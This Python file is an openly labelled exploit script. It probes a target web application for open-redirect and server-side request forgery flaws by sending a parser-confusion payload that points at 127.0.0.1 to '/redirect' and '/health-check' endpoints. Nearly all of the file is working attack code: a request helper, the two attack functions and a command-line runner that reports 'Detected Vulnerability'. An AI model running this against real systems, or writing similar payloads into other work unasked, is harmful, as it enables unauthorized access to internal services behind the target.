import http.client
import argparse
from urllib.parse import urlparse

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Connection": "keep-alive",
}

# Flag to determine if a vulnerability was detected
vulnerability_detected = False

def send_request(endpoint):
    global vulnerability_detected
    url = urlparse(endpoint)
    connection = http.client.HTTPConnection(url.hostname, url.port or 80)
    path = f"{url.path}?{url.query}"
    
    try:
        connection.request("GET", path, headers=HEADERS)
        response = connection.getresponse()
        response_data = response.read().decode("utf-8")
        
        print(f"[DEBUG] Request URL: {endpoint}")
        print(f"[DEBUG] Status Code: {response.status}")
        
        if response.status == 200:
            print("[+] Successful response received!")
            vulnerability_detected = True
        elif response.status == 302:
            print(f"[+] Redirected to: {response.getheader('Location')}")
        else:
            print(f"[-] Attack failed. Status code: {response.status}")
            print(response_data)
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        connection.close()

def open_redirect_attack(target_url):
    payload = "http://@127.0.0.1%5b@www.baidu.com/robots.txt"
    endpoint = f"{target_url}/redirect?url={payload}"
    print("[*] Attempting Open Redirect Attack...")
    send_request(endpoint)

def ssrf_attack(target_url):
    print("[*] Attempting SSRF Attack...")
    payload = "http://@127.0.0.1%5b@www.baidu.com/robots.txt"
    endpoint = f"{target_url}/health-check?url={payload}"
    print(f"[*] Trying SSRF with payload: {payload}")
    send_request(endpoint)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Exploit script for Open Redirect and SSRF attacks.")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    args = parser.parse_args()

    TARGET_URL = args.url

    open_redirect_attack(TARGET_URL)
    ssrf_attack(TARGET_URL)

    # Final output
    if vulnerability_detected:
        print("\nDetected Vulnerability: True")
    else:
        print("\nDetected Vulnerability: False")